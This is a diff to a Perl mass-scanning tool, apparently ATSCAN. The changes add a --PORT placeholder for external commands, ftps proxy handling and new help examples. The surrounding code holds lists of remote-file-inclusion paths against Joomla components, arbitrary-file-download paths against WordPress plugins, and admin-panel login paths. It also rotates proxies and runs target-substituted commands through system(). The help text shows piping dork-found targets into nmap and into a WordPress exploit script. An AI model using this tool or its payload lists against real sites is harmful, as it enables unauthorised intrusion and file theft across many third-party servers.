@@ -369,6 +369,7 @@ my $pat2='inurl:|intitle:|intext:|allinurl:|index of|site:(.*)\+|\+site:(.*)';
 ######################################################################################################################################################################################################
 ######################################################################################################################################################################################################
 ## MAX POSITIVE SCAN RESULTS
+## Chnage for more positive scans!!
 $limit="500" if !defined $limit;
 ######################################################################################################################################################################################################
 ######################################################################################################################################################################################################
@@ -514,7 +515,7 @@ my @RFIargs=("/JMc/com_flyspray/startdown.php?file=", "/JMa/JMc/com_admin/admin.
              "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&PP1", "/com_ponygallery/admin.ponygallery.html.php?PP1",
              "/com_magazine_3_0_1/magazine.functions.php?config=", "/JMa/JMc/com_joomla-visites/core/include/myMailer.class.php?PP1", "/JMa/JMc/com_universal/includes/config/config.html.php?PP1",
              "/modules/mod_pxt_latest.php?PP2");
-#############
+######################################################################################################################################################################################################
 my @RFI;
 for my $RFIargs(@RFIargs) {
   $RFIargs=~s/JMa/administrator/ig;
@@ -555,7 +556,7 @@ my @ADFWPargs=("/wp-admin/admin-ajax.php?action=revslider_show_image&img=WP1",
 "WPATHP/justified-image-grid/DWF=file:///var/www/WP1",
 "WPATHP/aspose-doc-exporter/aspose_doc_exporter_DWF=WP1",
 "WPATHP/aspose-cloud-ebook-generator/aspose_posts_exporter_DWF=WP1");
-#############
+######################################################################################################################################################################################################
 my @ADFWP;
 for my $ADFWPargs(@ADFWPargs) {
   $ADFWPargs=~s/DWF/download.php?file/ig;
@@ -582,7 +583,7 @@ my @ADMINARGS=("/admin/", "/admin/login.MYEXT", "/myadmin/", "/acceso/", "/admin
                "/panel-administracion/index.MYEXT", "/panel-administracion/admin.MYEXT", "/modelsearch/index.MYEXT", "/modelsearch/admin.MYEXT", "/admincontrol/login.MYEXT", "/adm/index.MYEXT",
                "adm.MYEXT", "account.MYEXT", "/adm/admloginuser.MYEXT", "/admloginuser.MYEXT", "/admin2.MYEXT", "/admin2/login.MYEXT", "/admin2/index.MYEXT", "/usuarios/login.MYEXT",
                "/users/login.MYEXT", "/adm.MYEXT", "/affiliate.MYEXT", "/adm_auth.MYEXT", "/memberadmin.MYEXT", "/administratorlogin.MYEXT");
-##########################
+######################################################################################################################################################################################################
 my @ADMIN;
 for my $ADMINARGS(@ADMINARGS) {
   if ($ADMINARGS=~/MYEXT/) {
@@ -761,7 +762,7 @@ my $psx=$proxies[rand @proxies];
 ######################################################################################################################################################################################################
 ######################################################################################################################################################################################################
 ## SET BROWSER 
-sub UA { $ua->proxy([qw/ http https ftp /] => $psx); $ua->cookie_jar({ }); }
+sub UA { $ua->proxy([qw/ http https ftp ftps /] => $psx); $ua->cookie_jar({ }); }
 ######################################################################################################################################################################################################
 ######################################################################################################################################################################################################
 ## RENEW PROXY
@@ -935,7 +936,7 @@ sub checkExtraInfo {
 ## CLEAN URL
 sub cleanURL {
   my $URL=$_[0];
-  my %replace=( 'http://' => '', 'https://' => '', 'www.' => '', 'ftp://' => '', );
+  my %replace=( 'http://' => '', 'https://' => '', 'www.' => '', 'ftp://' => '', 'ftps://' => '');
   $URL=~s/$_/$replace{ $_}/g for keys %replace;
   $URL=~s/\/.*//s;
   return $URL;
@@ -1381,18 +1382,28 @@ sub getRegex {
 sub getComnd {
   my ($URL1, $comnd)=@_;
   $URL1=~s/(\%27|\<|\>|\%25|\')(.*)//ig;
-  if ($comnd=~/\-HOSTIP/) {
-    my $ips=checkExtraInfo($URL1);
-    if ($ips) { my $ad=inet_ntoa($ips); $comnd=~s/\-\-HOSTIP/$ad/ig; }
-    else{ print "$c[2] $TT[11]\n"; }
+  if ($URL1=~/(($V_IP)\:(\d{2,6}))/) {
+    $URL1=removeProtocol($URL1);
+    if ($comnd=~/-PORT/) {
+      $URL1=~s/\:/\./g;
+      my @f=split /\./, $URL1;
+      my $Addr="$f[0].$f[1].$f[2].$f[3]";
+      my $Port=$f[4];
+      $comnd=~s/\-\-TARGET/$Addr/ig;
+      $comnd=~s/\-\-PORT/$Port/ig;
+    }else{ $comnd=~s/\-\-TARGET/$URL1/ig; }
+  }else{
+    if ($comnd=~/\-HOSTIP/) {
+      my $ips=checkExtraInfo($URL1);
+      if ($ips) { my $ad=inet_ntoa($ips); $comnd=~s/\-\-HOSTIP/$ad/ig; }
+      else{ print "$c[2] $TT[11]\n"; }
+    }elsif ($comnd=~/\-HOST/) {
+      $URL1=removeProtocol($URL1);   
+      $URL1=~s/\/.*//s;
+      $URL1=checkUrlSchema($URL1);
+      $comnd=~s/\-\-HOST/$URL1/ig;
+    }elsif ($comnd=~/\-TARGET/) { $comnd=~s/\-\-TARGET/$URL1/ig; }
   }
-  elsif ($comnd=~/\-HOST/) {
-    $URL1=removeProtocol($URL1);   
-    $URL1=~s/\/.*//s;
-    $URL1=checkUrlSchema($URL1);
-    $comnd=~s/\-\-HOST/$URL1/ig;
-  }
-  elsif ($comnd=~/\-TARGET/) { $comnd=~s/\-\-TARGET/$URL1/ig; }
   stakScan(); print $c[8]; system($comnd); print "\n";
 }
 ######################################################################################################################################################################################################
@@ -2148,6 +2159,7 @@ sub help {
   ."  --TARGET       | Will be replaced by target in extern command \n"
   ."  --HOST         | Will be replaced by host in extern command \n"
   ."  --HOSTIP       | Will be replaced by host IP in extern command \n"
+  ."  --PORT         | Will be replaced by open port in extern command \n"
   ."  --ip           | Crawl to get Ips\n"
   ."  --regex        | Crawl to get strings matching regex\n"
   ."  --noquery      | Remove string value from Query url [ex: site.com/index.php?id=string] \n"  
@@ -2217,6 +2229,7 @@ sub help {
   ."   atscan --dork <dork | dorks.txt> --level <level> --command \"curl -v --TARGET\" \n"
   ."   atscan --dork <dork | dorks.txt> --level <level> --command \"curl -v --HOST\" \n"
   ."   atscan --dork <dork | dorks.txt> --level <level> --command \"nmap sV -p 21,22,80 --HOSTIP\" \n"
+  ."   atscan -t <target> --port 80 --udp --command \"nmap sV -p --PORT --TARGET\" \n" 
   ."   atscan -d \"index of /lib/scripts/dl-skin.php\" -l 20 -m 2 --command \"php WP-dl-skin.php-exploit.php --TARGET\" \n\n";
   
   ltak(); print $c[12]."  MULTIPLE SCANS: \n".$c[10]
